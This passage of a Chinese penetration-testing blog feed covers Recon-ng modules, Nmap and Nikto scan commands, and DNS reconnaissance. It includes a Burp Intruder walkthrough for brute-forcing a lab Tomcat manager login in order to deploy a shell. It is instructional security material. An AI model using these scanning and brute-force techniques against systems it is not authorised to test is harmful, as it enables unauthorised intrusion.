将记录添加到数据库中</p><p>back            退出当前回话</p><p>delete          从数据库中删除记录</p><p>exit            退出框架</p><p>help           显示帮助</p><p>keys            管理框架API键</p><p>load            加载指定模块</p><p>pdb             打开 Python 的 Debug 回话</p><p>query           查询数据库</p><p>record          Records commands to a resource filereload          重新加载所有模块</p><p>resource       Executes commands from a resource filesearch          搜索可用的模块</p><p>set                设置模块的选择</p><p>shell              执行shell命令</p><p>show             显示各种框架项目</p><p>snapshots     管理工作区快照</p><p>spool            Spools output to a file</p><p>unset            附件模块选择</p><p>use               加载指定的模块</p><p>workspaces   管理工作区</p><p><strong>用法：show modules</strong>  </p><p><img src="http://imglf4.nosdn.127.net/img/d0pJMFNGSnJ5LzZPUUpDVFN2d0Flc2paQk1YWG83c3VOSW5YR0JLMzlEVmJWOHcyemFHQjNBPT0.jpg?imageView" alt></p><p>Recon-ng约有80个recon模块，2个发现模块，2个exp利用模块，7个报告模块和2个导入模块：</p><blockquote><p>cache_snoop – DNS缓存录制</p><p>interesting_files – 敏感文件探测</p><p>command_injector – 远程命令注入shell接口</p><p>xpath_bruter – Xpath注入爆破</p><p>csv_file – 高级csv文件导入</p><p>list – List文件导入</p><p>point_usage – Jigsaw – 统计信息提取用法</p><p>purchase_contact – Jigsaw – 简单的联系查询</p><p>search_contacts – Jigsaw联系枚举</p><p>jigsaw_auth – Jigsaw认证联系枚举</p><p>linkedin_auth – LinkedIn认证联系枚举</p><p>github_miner – Github资源挖掘</p><p>whois_miner – Whois数据挖掘</p><p>bing_linkedin – Bing Linkedin信息采集</p><p>email_validator – SalesMaple邮箱验证</p><p>mailtester – MailTester邮箱验证</p><p>mangle – 联系分离</p><p>unmangle –联系反分离</p><p>hibp_breach –Breach搜索</p><p>hibp_paste – Paste搜索</p><p>pwnedlist – PwnedList验证</p><p>migrate_contacts – 域名数据迁移联系</p><p>facebook_directory – Facebook目录爬行</p><p>fullcontact – FullContact联系枚举</p><p>adobe – Adobe Hash破解</p><p>bozocrack – PyBozoCrack Hash 查询</p><p>hashes_org – Hashes.org Hash查询</p><p>leakdb – leakdb Hash查询</p><p>metacrawler – 元数据提取</p><p>pgp_search – PGP Key Owner查询</p><p>salesmaple – SalesMaple联系获取</p><p>whois_pocs – Whois POC获取</p><p>account_creds – PwnedList – 账户认证信息获取</p><p>api_usage – PwnedList – API使用信息</p><p>domain_creds – PwnedList – Pwned域名认证获取</p><p>domain_ispwned – PwnedList – Pwned域名统计获取</p><p>leak_lookup – PwnedList – 泄露信息查询</p><p>leaks_dump – PwnedList –泄露信息获取</p><p>brute_suffix – DNS公共后缀爆破</p><p>baidu_site – Baidu主机名枚举</p><p>bing_domain_api – Bing API主机名枚举</p><p>bing_domain_web – Bing主机名枚举</p><p>brute_hosts – DNS主机名爆破</p><p>builtwith – BuiltWith枚举</p><p>google_site_api – Google CSE主机名枚举</p><p>google_site_web – Google主机名枚举</p><p>netcraft – Netcraft主机名枚举</p><p>shodan_hostname – Shodan主机名枚举</p><p>ssl_san – SSL SAN查询</p><p>vpnhunter – VPNHunter查询</p><p>yahoo_domain – Yahoo主机名枚举</p><p>zone_transfer – DNS域文件收集</p><p>ghdb – Google Hacking数据库</p><p>punkspider – PunkSPIDER漏洞探测</p><p>xssed – XSSed域名查询</p><p>xssposed – XSSposed域名查询</p><p>migrate_hosts – 域名数据迁移host</p><p>bing_ip – Bing API旁站查询</p><p>freegeoip –FreeGeoIP ip定位查询</p><p>ip_neighbor – My-IP-Neighbors.com查询</p><p>ipinfodb – IPInfoDB GeoIP查询</p><p>resolve – 主机名解析器</p><p>reverse_resolve – 反解析</p><p>ssltools – SSLTools.com主机名查询</p><p>geocode – 地理位置编码</p><p>reverse_geocode – 反地理位置编码</p><p>flickr – Flickr地理位置查询</p><p>instagram – Instagram地理位置查询</p><p>picasa – Picasa地理位置查询</p><p>shodan – Shodan地理位置查询</p><p>twitter – Twitter地理位置查询</p><p>whois_orgs – Whois公司信息收集</p><p>reverse_resolve – 反解析</p><p>shodan_net – Shodan网络枚举</p><p>census_2012 – Internet Census 2012 查询</p><p>sonar_cio – Project Sonar查询</p><p>migrate_ports – 主机端口数据迁移</p><p>dev_diver – Dev Diver Repository检查</p><p>linkedin – Linkedin联系获取</p><p>linkedin_crawl – Linkedin信息抓取</p><p>namechk – NameChk.com用户名验证</p><p>profiler – OSINT HUMINT信息收集</p><p>twitter – Twitter操作</p><p>github_repos – Github代码枚举</p><p>gists_search – Github Gist搜索</p><p>github_dorks – Github Dork分析</p><p>csv – CSV文件生成</p><p>html – HTML报告生成</p><p>json – JSON报告生成</p><p>list – List生成</p><p>pushpin – PushPin报告生成</p><p>xlsx – XLSX文件创建</p><p>xml – XML报告生成</p></blockquote><ol start="3"><li>showschema        显示数据库中的数据结构</li></ol><p><img src="http://imglf3.nosdn.127.net/img/d0pJMFNGSnJ5LzVPTDYwcFhMWHVNc0FUcDVEeEYxQnBCR3NPK2dyc2ZVeTN1a0d3ZDNqMGtnPT0.jpg?imageView" alt></p><p><strong>双击tab键       #显示模块，可用search 寻找模块 使用show options/info先看一下参数</strong></p><ol start="4"><li>use recon/domains-hosts/google_site_api</li></ol><p><img src="http://imglf3.nosdn.127.net/img/d0pJMFNGSnJ5LzRFRUhCNUVrQkhleHE5NG1qZXRHQmZqMEw4UE1qNUZkWHNGYUlZNUovY0l3PT0.jpg?imageView" alt></p><ol start="5"><li>show options</li></ol><p><img src="http://imglf5.nosdn.127.net/img/d0pJMFNGSnJ5LzU3eVo1cDFIdGplWmpoVktZaVg0NFIxMXllZmlaOFROYjN5TmNzdVZJdnpnPT0.jpg?imageView" alt></p><ol start="6"><li>指定域  set SOURCE <code>&lt;strong&gt; sina.com &lt;/strong&gt;</code></li></ol><p><img src="http://imglf6.nosdn.127.net/img/d0pJMFNGSnJ5LzZDWVcyUmFlSWxFNzlYdlBQMC9jc3NISWdhMkx1UGV3b0V0ZWxhZGFFYzJBPT0.jpg?imageView" alt></p><ol start="7"><li>run</li></ol><p><img src="http://imglf6.nosdn.127.net/img/d0pJMFNGSnJ5LzR2OWZwaUFIeUc4bEwyd01MRU5JMnRXVTNhZmdwQmRpME91eGJwbDFRY0hnPT0.jpg?imageView" alt></p><p>我这没有加key,具体可以查看官方文档</p><p>查看key  ,可以输入keys  list </p><p><img src="http://imglf3.nosdn.127.net/img/d0pJMFNGSnJ5LzQ5VkQ1SzBpRndMOVM0d3lUUnNDV1lpYmY1aHdMZjQ2MHpHMmM1M2J5L1FnPT0.jpg?imageView" alt></p><h2 id="端口扫描，服务识别，OS识别，漏洞扫描"><a href="#端口扫描，服务识别，OS识别，漏洞扫描" class="headerlink" title="端口扫描，服务识别，OS识别，漏洞扫描"></a>端口扫描，服务识别，OS识别，漏洞扫描</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>带服务识别和操作系统指纹识别的TCP/IP主机和端口扫描工具<br><img src="http://imglf5.nosdn.127.net/img/d0pJMFNGSnJ5LzZUdU5IQVVpUlNoUEZDUzdkOVdiZXl1MmhNNzl4TUZURzE5RXFvMzhGYUZ3PT0.gif?imageView" alt></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><ul><li>扫描前1000号TCP端口</li></ul><p>nmap 192.168.100.2</p><ul><li>Ping批量扫描本地主机</li></ul><p>nmap –sP 192.168.100.0-9</p><ul><li>扫描80,443端口</li></ul><p>nmap -p 80,443 192.168.100.2</p><ul><li>扫描前1000号TCP端口，OS指纹，服务，然后运行一个NSE脚本</li></ul><p>sudo nmap -A 192.168.100.2</p><ul><li>扫描全部65535个TCP端口，OS指纹，服务，然后运行一个NSE脚本</li></ul><p>sudo nmap –A –p- 192.168.100.2</p><ul><li>扫描前1000号UDP端口</li></ul><p>nmap -sU 192.168.100.2</p><ul><li>扫描所有65535个UDP端口</li></ul><p>nmap -sU –p- 192.168.100.2</p><h4 id="脚本扫描"><a href="#脚本扫描" class="headerlink" title="脚本扫描"></a>脚本扫描</h4><p>nmap脚本主要分为以下几类，在扫描时可根据需要设置–script=类别这种方式进行比较笼统的扫描：</p><p>auth: 负责处理鉴权证书（绕开鉴权）的脚本<br>broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务<br>brute: 提供暴力破解方式，针对常见的应用如http/snmp等<br>default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力<br>discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等<br>dos: 用于进行拒绝服务攻击<br>exploit: 利用已知的漏洞入侵系统<br>external: 利用第三方的数据库或资源，例如进行whois解析<br>fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽<br>malware: 探测目标机是否感染了病毒、开启了后门等信息<br>safe: 此类与intrusive相反，属于安全性脚本<br>version: 负责增强服务与版本扫描（Version Detection）功能的脚本<br>vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</p><ul><li>nmap –script=auth 192.168.2.129</li></ul><p>​    负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令</p><ul><li><p>nmap –script=brute 192.168.2.129</p><p>提供暴力破解的方式  可对数据库，smb，snmp等进行简单密码的暴力猜解</p></li><li><p>nmap –script=default 192.168.2.129</p><p>默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击</p></li><li><p>nmap –script=vuln 192.168.2.129<br>检查是否存在常见漏洞</p></li><li><p>nmap -n -p445 –script=broadcast 192.168.2.129</p><p>在局域网内探查更多服务开启状况</p></li></ul><h3 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h3><p>有指纹识别功能的Web服务漏洞扫描器</p><ul><li>Nikto -list-plugins #查看插件<br><img src="http://imglf6.nosdn.127.net/img/d0pJMFNGSnJ5Lzd5Qm9rUWt5V0tSaDFkS1pVQWpQZHVsQytkVkZuWFdQRnVsSmVIZ3RSMDVnPT0.gif?imageView" alt></li><li>Nikto -host <a href="http://1.1.1.1" target="_blank" rel="noopener">http://1.1.1.1</a> #扫描目标：域名方式<br><img src="http://imglf4.nosdn.127.net/img/d0pJMFNGSnJ5LzQxNnpHWlI3azB4VitmNi9DQ0pkRUNkUE9YSWEvMTE2SkFXT0FqYUkxTUl3PT0.gif?imageView" alt></li><li>Nikto -host <a href="http://1.1.1.1" target="_blank" rel="noopener">http://1.1.1.1</a> -output #扫描并输出结果</li><li>Nikto -host 1.1.1.1 -port 80 #扫描目标：ip地址加端口</li></ul><p><img src="http://imglf5.nosdn.127.net/img/d0pJMFNGSnJ5LzRKdGF2d0g1Q29VSVNEeFBKMk1NNHlMNUp0c2tYaDVoWU9LUkRuMkxUeXNBPT0.gif?imageView" alt></p><ul><li>Nikto -host <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> -port 443 -ssl #扫描https网站</li></ul><p><img src="http://imglf6.nosdn.127.net/img/d0pJMFNGSnJ5LzdTT3ZuTy9XdUdRNmJDaGxSemVmQ3JhbGZsNTdhcVE2cENLcWltK0JvRU9nPT0.gif?imageView" alt></p><ul><li>Nikto -host 文件名.txt #批量扫描目标</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;http://imglf3.nosdn0.126.net/img/d0pJMFNGSnJ5LzQ5dW85VzhtSmJ3NmxobE1DTHA2QjE0TlJ5OTlVd0FiM2VkTkhsWTM3UFBnPT0.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h2 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>windows 渗透测试必备命令</title>
    <link href="http://lilifengcode.github.io/post/7fef8ea1.html"/>
    <id>http://lilifengcode.github.io/post/7fef8ea1.html</id>
    <published>2019-04-17T13:00:19.000Z</published>
    <updated>2019-06-28T08:25:01.160Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s2.ax1x.com/2019/04/17/AzoxDU.md.jpg" alt></p><h1 id="windows-渗透测试必备命令"><a href="#windows-渗透测试必备命令" class="headerlink" title="windows 渗透测试必备命令"></a>windows 渗透测试必备命令</h1><p><img src="https://s2.ax1x.com/2019/04/17/Az5bZQ.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/04/17/AzoxDU.md.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h1 id=&quot;windows-渗透测试必备命令&quot;&gt;&lt;a href=&quot;#windows-渗透测试必备命令&quot; class=&quot;headerlink&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Tomcat 渗透测试</title>
    <link href="http://lilifengcode.github.io/post/ee65faca.html"/>
    <id>http://lilifengcode.github.io/post/ee65faca.html</id>
    <published>2019-04-15T15:04:08.000Z</published>
    <updated>2019-06-28T11:08:37.086Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s2.ax1x.com/2019/04/15/AvkwMF.md.jpg" alt></p><h2 id="Tomcat-burpsuite爆破"><a href="#Tomcat-burpsuite爆破" class="headerlink" title="Tomcat burpsuite爆破"></a>Tomcat burpsuite爆破</h2><ol><li><p>在渗透测试中，我们经常遇到tomcat后台被默认部署在外部的情况，<br><a href="http://192.168.6.16:8080/" target="_blank" rel="noopener">http://192.168.6.16:8080/</a>   【本地搭建—这是废话—我怕又被官方封了】</p><p><img src="https://s2.ax1x.com/2019/04/15/AvkodA.png" alt></p></li><li><p>在这种情况下，我们都会选择去爆破来进入后台部署shell。<br>先抓取一下我们的登录包：</p><p><img src="https://s2.ax1x.com/2019/04/15/AvkqRf.png" alt></p></li><li><p>输出用户名tomcat 密码tomcat,打开burpsuite 抓包</p><p><img src="https://s2.ax1x.com/2019/04/15/AvkzZj.jpg" alt></p></li><li><p>解码看看，发现用户名是以tomcat:tomcat方式用base64加密了</p><p><img src="https://s2.ax1x.com/2019/04/15/AvAPJ0.png" alt></p></li><li><p>接下来，我们演示如何用burpsuite进行爆破</p><p>首先将数据包发送到Intruder模块，添加一个变量：</p><p><img src="https://s2.ax1x.com/2019/04/15/AvAmw9.png" alt></p></li><li><p>在设置Payload的时候要使用自定义迭代器：</p><p><img src="https://s2.ax1x.com/2019/04/15/AvA3QO.png" alt></p></li><li><p>由于登录令牌都是base64加密的，我们需要 [用户名]:[密码]这样的格式进行base64-encde才可以发送出去</p></li><li><p>设置三个迭代payload分别代表：用户名  、   :       、  密码   。<br>第一位设置用户名这类的字典</p><p><img src="https://s2.ax1x.com/2019/04/15/AvAYeH.png" alt></p></li><li><p>第二位设置  :</p></li></ol><p><img src="https://s2.ax1x.com/2019/04/15/AvA7m4.png" alt></p><ol start="10"><li><p>第三位设置密码</p><p><img src="https://s2.ax1x.com/2019/04/15/AvAH0J.png" alt></p></li><li><p>然后设置一个编码器，选择base64这个函数：</p></li></ol><p><img src="https://s2.ax1x.com/2019/04/15/AvAOt1.png" alt></p><p><img src="https://s2.ax1x.com/2019/04/15/AvAXfx.png" alt></p><p>12.接下来再将url编码去掉，因为在base64密文里=会被编码</p><p><img src="https://s2.ax1x.com/2019/04/15/AvEP7d.png" alt></p><ol start="13"><li><p>爆破【上面有个小错误，为了长记性就没修改，添加变量的时候把basic加上了】</p><p><img src="https://s2.ax1x.com/2019/04/15/AvEktI.png" alt></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/04/15/AvkwMF.md.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h2 id=&quot;Tomcat-burpsuite爆破&quot;&gt;&lt;a href=&quot;#Tomcat-burpsuite爆破&quot; class=&quot;headerl
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>浅谈DNS</title>
    <link href="http://lilifengcode.github.io/post/c22bb9af.html"/>
    <id>http://lilifengcode.github.io/post/c22bb9af.html</id>
    <published>2019-04-15T11:52:37.000Z</published>
    <updated>2019-06-28T08:25:01.160Z</updated>
    
    <content type="html"><![CDATA[<h1 id="浅谈DNS"><a href="#浅谈DNS" class="headerlink" title="浅谈DNS"></a>浅谈DNS</h1><h2 id="0X00-什么是DNS"><a href="#0X00-什么是DNS" class="headerlink" title="0X00 什么是DNS"></a>0X00 什么是DNS</h2><p>DNS（Domain Name System，域名系统），万维网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过域名，最终得到该域名对应的IP地址的过程叫做域名解析（或主机名解析）。<br>在整个互联网体系中，约定俗成的用于标识网络上设备的地址是IP，然而我们输入的是DNS，因为域名更方便人们记忆，不然那么多网站，人怎么可能记住所有的IP地址</p><p><strong>简单来说，如果没有DNS，你访问网站就需要，记住网站的IP地址    【123.XXX.XXX.XXX】，进而通过IP地址来访问网站,我就问你能记住多少！浪费脑细 胞！</strong></p><p>DNS协议运行在<a href="https://baike.baidu.com/item/UDP" target="_blank" rel="noopener">UDP</a>协议之上，使用端口号53</p><h2 id="0X01-DNS查询方式"><a href="#0X01-DNS查询方式" class="headerlink" title="0X01 DNS查询方式"></a>0X01 DNS查询方式</h2><ol><li>递归查询: 一般客户机和首选DNS服务器(宽带连接是设置的默认DNS)之间属递归查询，即当客户机向DNS服务器发出请求后,若DNS服务器本身不能解析，则会向另外的DNS服务器发出查询请求，得到最终结果后转交给客户机</li><li>迭代查询(反复查询): 一般DNS服务器之间属迭代查询，如：若DNS2不能响应DNS1的请求，则它会将DNS3的IP给DNS2，以便其再向DNS3发出请求</li></ol><p><img src="https://s2.ax1x.com/2019/04/15/AjJq6H.png" alt="AjJq6H.png"></p><h2 id="0X02-DNS解析过程"><a href="#0X02-DNS解析过程" class="headerlink" title="0X02 DNS解析过程"></a>0X02 DNS解析过程</h2><ol><li>浏览器缓存：浏览器会按照一定的频率缓存DNS记录。</li><li>操作系统缓存：如果浏览器缓存中找不到需要的DNS记录，那就去操作系统中找。　　</li><li>路由缓存：路由器也有DNS缓存。</li><li>ISP的DNS服务器：ISP是互联网服务提供商(Internet Service Provider)的简称，ISP有专门的DNS服务器应对DNS查询请求。</li><li>根服务器：ISP的DNS服务器还找不到的话，它就会向根服务器发出请求，进行递归查询（DNS服务器先问根域名服务器.com域名服务器的IP地址，然后再问.com域名服务器，依次类推）。</li></ol><p><img src="https://s2.ax1x.com/2019/04/15/AjYGH1.png" alt="AjYGH1.png"></p><h2 id="0X03-DNS记录类型"><a href="#0X03-DNS记录类型" class="headerlink" title="0X03 DNS记录类型"></a>0X03 DNS记录类型</h2><ol><li>主机记录(A记录)<br>RFC 1035定义，A记录是用于名称解析的重要记录，它将特定的主机名映射到对应主机的IP地址上。过A记录，大家可以设置自己的不同域名转到不同的IP上去，如：<br>1) <a href="http://www.dns.la" target="_blank" rel="noopener">www.dns.la</a> 转到IP 116.255.202.1<br>2) web.dns.la 转到IP 116.255.202.11<br>3) mail.dns.la 转到IP 116.255.202.111</li><li>别名记录(CNAME记录)<br>RFC 1035定义，CNAME记录用于将某个别名指向到某个A记录上，这样就不需要再为某个新名字另外创建一条新的A记录。对于CNAME的原理要注意和URL转发进行区分:<br>1) url转发可以转发到某一个目录下，甚至某一个文件上<br>2) 而cname是不可以，这就是url转发和cname的主要区别所在</li><li>MX记录(Mail Exchange)<br>邮件交换记录，用户可以将该域名下的邮件服务器指向到自己的mail server上，然后即可自行操作控制所有的邮箱设置。要注意的是邮箱DNS解析和HTTP DNS解析是独立的，如果你设置A记录<br>  是指向123.12.123.123，而MX记录你设置是指向222.22.222.222，那么你的DNS服务器接收到别人的邮件路 由请求时就将会将它的请求解释到222.22.222.222上去！而别人访问你的网页<br>  的时候仍然是访问123.12.123.123。</li><li>NS(Name Server)<br>域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析，可以把一个域名的不同二级域名分别指向到不同的DNS系统来解析</li><li>IPv6主机语录(AAAA记录)<br>RFC 3596定义，与A记录对应，用于将特定的主机名映射到一个主机的IPv6地址。</li><li>服务位置记录(SRV记录)<br>RFC 2782定义，用于定义提供特定服务的服务器的位置，如主机(hostname)，端口(port number)等。</li><li>NAPTR记录<br>RFC 3403定义，它提供了正则表达式方式去映射一个域名。NAPTR记录非常著名的一个应用是用于ENUM查询。</li></ol><h2 id="0X04-DNS搜集信息工具"><a href="#0X04-DNS搜集信息工具" class="headerlink" title="0X04 DNS搜集信息工具"></a>0X04 DNS搜集信息工具</h2><h3 id="dnsrecon"><a href="#dnsrecon" class="headerlink" title="dnsrecon"></a>dnsrecon</h3><ul><li><p>命令  dnsrecon -t std -d <a href="http://www.ichunqiu.com" target="_blank" rel="noopener">www.ichunqiu.com</a></p><p><img src="https://s2.ax1x.com/2019/04/15/AjYHU0.png" alt="AjYHU0.png"></p><p>这里可以看出**使用了创宇盾，加速乐还有一条A记录</p></li><li><p>域传送漏洞的验证</p><p>命令  dnsrecon -t std -d <a href="http://www.ichunqiu.com" target="_blank" rel="noopener">www.ichunqiu.com</a> -a</p><p><img src="https://s2.ax1x.com/2019/04/15/AjtSbR.png" alt="AjtSbR.png"></p><h3 id="dnswalk"><a href="#dnswalk" class="headerlink" title="dnswalk"></a>dnswalk</h3><h3 id="dnstracer"><a href="#dnstracer" class="headerlink" title="dnstracer"></a>dnstracer</h3></li></ul><ol><li><p>向指定域名服务器发送非递归域名请求。非递归请求的意思是，如果域名服务器知道，那么它会返回请求数据。如果域名服务器不知道，它会返回授权域的域名服务器或返回根域名服务器的地址。</p></li><li><p>参数含义-c: 不允许使用本地缓存,默认允许 -C: 启用否定缓存，默认禁用-o: 启用收到响应的概述，默认禁用-q   <querytype>: 设置请求的DNS查询记录类型, 默认为A记录-r <retries>: 请求重试次数, 默认为  3 次-s <server>: 设置一个DNS服务器，默认为本地-t <maximum timeout>: 超时时间-v: 查看详细信息-S <ip address>: 伪造一个源地址.</ip></maximum></server></retries></querytype></p><p><img src="https://s2.ax1x.com/2019/04/15/AjNnlF.png" alt="AjNnlF.png"></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;浅谈DNS&quot;&gt;&lt;a href=&quot;#浅谈DNS&quot; class=&quot;headerlink&quot; title=&quot;浅谈DNS&quot;&gt;&lt;/a&gt;浅谈DNS&lt;/h1&gt;&lt;h2 id=&quot;0X00-什么是DNS&quot;&gt;&lt;a href=&quot;#0X00-什么是DNS&quot; class=&quot;headerlink
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Fuzz-漏洞挖掘利器</title>
    <link href="http://lilifengcode.github.io/post/cd677755.html"/>
    <id>http://lilifengcode.github.io/post/cd677755.html</id>
    <published>2019-04-15T11:41:49.000Z</published>
    <updated>2019-06-28T08:25:01.143Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Fuzz-漏洞挖掘利器"><a href="#Fuzz-漏洞挖掘利器" class="headerlink" title="Fuzz-漏洞挖掘利器"></a>Fuzz-漏洞挖掘利器</h1><h2 id="0x00-什么模糊测试"><a href="#0x00-什么模糊测试" class="headerlink" title="0x00 什么模糊测试"></a>0x00 什么模糊测试</h2><p>模糊测试（fuzz testing）是一种介于完全的手工渗透测试与完全的自动化测试之间的安全性测试类型。能够在一项产品投入市场使用之前对潜在的应当被堵塞的攻击渠道进行提示。</p><p>模糊测试（fuzz testing)和渗透测试（penetration test）都是属于安全测试的方法，它们有同也有异，渗透测试一般是模拟黑客恶意入侵的方式对产品进行测试，对测试者的执行力要求很高，成本高，难以被大规模应用。而模糊测试，它能够充分利用机器本身，随机生成和发送数据；与此同时，又能够引进业内安全专家在安全性方面的建议。模糊测试其数据具有不确定性，也没有明显的针对性，简单来说就是没有逻辑，没有常理。只要将准备好的那些杂乱的程序插入其中，然后等待bug的出现，而出现的漏洞是测试员们先前无法预知的。</p><h2 id="0x01-Web渗透中常规FUZZ相关的手段"><a href="#0x01-Web渗透中常规FUZZ相关的手段" class="headerlink" title="0x01 Web渗透中常规FUZZ相关的手段"></a>0x01 Web渗透中常规FUZZ相关的手段</h2><ul><li>目录扫描</li><li>口令枚举</li><li>爬虫</li><li>….</li></ul><h2 id="0x02-ByPass的原理"><a href="#0x02-ByPass的原理" class="headerlink" title="0x02 ByPass的原理"></a>0x02 ByPass的原理</h2><p>在这里我们构建一个概念模型：</p><p><img src="https://s2.ax1x.com/2019/04/15/AjwhvT.png" alt></p><p>Bypass就是寻找大于深绿区域的那块黑色内容</p><p><strong>没有绝对安全的系统，当然防护是一样</strong></p><p>通常情况下，我们的目的都是发送一些攻击且能够快速有效验证漏洞payload，但是这些常用的payload都被WAF加入了规则库中，如果遇到了规则库中存在的payload，WAF就要出来搞事情了，它会记录你的攻击数据，并且将到达Web服务器之前的数据给丢弃。如此一来，我们无法进行进一步的测试了   </p><h2 id="0x02-FuzzDB"><a href="#0x02-FuzzDB" class="headerlink" title="0x02 FuzzDB"></a>0x02 FuzzDB</h2><ul><li><strong>GIT:<a href="https://github.com/fuzzdb-project/fuzzdb" target="_blank" rel="noopener">https://github.com/fuzzdb-project/fuzzdb</a></strong></li><li><strong>playload下载：<a href="https://github.com/foospidy/payloads" target="_blank" rel="noopener">https://github.com/foospidy/payloads</a></strong></li></ul><p>FuzzDB是为了通过动态应用程序安全性测试来增加引起和识别安全感兴趣条件的可能性。</p><p>这是第一个也是最全面的故障注入模式的开放字典，可预测的资源位置，以及匹配服务器响应的正则表达式。</p><p>该数据库收集了大量已知的攻击模式，如XSS，Xpath注入，SQL注入，XML攻击，本地文件包含，路径遍历，远程文件包含，ldap攻击，格式化字符串，http协议攻击等</p><p><img src="https://s2.ax1x.com/2019/04/15/AjB1TH.png" alt></p><p><img src="https://s2.ax1x.com/2019/04/15/AjBl0e.png" alt></p><p><img src="https://s2.ax1x.com/2019/04/15/AjB1TH.png" alt></p><h2 id="0x03-FUZZDB项目"><a href="#0x03-FUZZDB项目" class="headerlink" title="0x03 FUZZDB项目"></a>0x03 FUZZDB项目</h2><ul><li>OWASP Zap Proxy fuzzdb plugin <a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project" target="_blank" rel="noopener">https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project</a></li><li>SecLists <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists</a></li><li>TrustedSec Pentesters Framework <a href="https://github.com/trustedsec/ptf" target="_blank" rel="noopener">https://github.com/trustedsec/ptf</a></li><li>Rapid7 Metasploit <a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></li><li>Portswigger Burp Suite <a href="http://portswigger.net" target="_blank" rel="noopener">http://portswigger.net</a></li><li>Protofuzz <a href="https://github.com/trailofbits/protofuzz" target="_blank" rel="noopener">https://github.com/trailofbits/protofuzz</a></li><li>BlackArch Linux <a href="https://www.blackarch.org/" target="_blank" rel="noopener">https://www.blackarch.org/</a></li><li>ArchStrike Linux <a href="https://archstrike.org/" target="_blank" rel="noopener">https://archstrike.org/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Fuzz-漏洞挖掘利器&quot;&gt;&lt;a href=&quot;#Fuzz-漏洞挖掘利器&quot; class=&quot;headerlink&quot; title=&quot;Fuzz-漏洞挖掘利器&quot;&gt;&lt;/a&gt;Fuzz-漏洞挖掘利器&lt;/h1&gt;&lt;h2 id=&quot;0x00-什么模糊测试&quot;&gt;&lt;a href=&quot;#0x00-什
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Python Skill</title>
    <link href="http://lilifengcode.github.io/post/56e84abc.html"/>
    <id>http://lilifengcode.github.io/post/56e84abc.html</id>
    <published>2019-04-12T14:53:04.000Z</published>
    <updated>2019-06-28T08:25:01.143Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="使用队列-多线程方法"><a href="#使用队列-多线程方法" class="headerlink" title="使用队列 多线程方法"></a>使用队列 多线程方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.path.append(&quot;..&quot;)</span><br><span class="line"></span><br><span class="line">import threading,socket,queue</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">lock = threading.Lock() # 